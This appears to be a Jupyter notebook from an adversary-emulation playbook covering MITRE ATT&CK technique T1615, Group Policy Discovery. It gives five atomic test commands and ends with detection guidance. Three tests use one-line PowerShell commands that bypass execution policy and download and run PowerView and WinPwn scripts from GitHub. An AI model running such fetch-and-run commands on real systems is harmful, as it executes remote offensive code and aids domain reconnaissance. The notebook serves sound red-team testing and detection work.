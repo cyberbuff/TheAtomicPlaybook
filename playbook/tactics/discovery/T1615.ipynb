{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8923e397",
   "metadata": {},
   "source": "# T1615 - Group Policy Discovery\nAdversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predicable network path <code>\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit."
  },
  {
   "cell_type": "markdown",
   "id": "5d103e25",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "77561a31",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Display group policy information via gpresult",
    "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ngpresult /z\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a357a1d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1615 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "8ef7cf9b",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Get-DomainGPO to display group policy information via PowerView",
    "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\npowershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "568d7129",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1615 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "60c5e404",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - WinPwn - GPOAudit",
    "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d94bf906",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1615 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "d3c00769",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - WinPwn - GPORemoteAccessPolicy",
    "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "871aeebb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1615 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "88fd5ac5",
   "metadata": {},
   "source": "### Atomic Test #5 - MSFT Get-GPO Cmdlet\nThe Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Add Rsat.ActiveDirectory.DS\n##### Check Prereq Commands:\n```powershell\nif(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }\n```\n##### Get Prereq Commands:\n```powershell\nAdd-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\n```\n##### Description: Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed for this to work on Win10, WinServer 2019 works by default. This will take a long time (almost 2 minutes) to install RSAT Manually###.\n##### Check Prereq Commands:\n```powershell\nif(Get-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }\n```\n##### Get Prereq Commands:\n```powershell\nAdd-WindowsCapability -online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17fd8a8c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1615 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "da5c6343",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51ceeb31",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1615 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "9b55c619",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ndel $env:temp\\GPO_Output.txt -erroraction silentlycontinue```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30378a5f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1615 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "69514ab1",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor for suspicious use of <code>gpresult</code>. Monitor for the use of PowerShell functions such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code> and processes spawning with command-line arguments containing <code>GPOLocalGroup</code>.\n\nMonitor for abnormal LDAP queries with filters for <code>groupPolicyContainer</code> and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}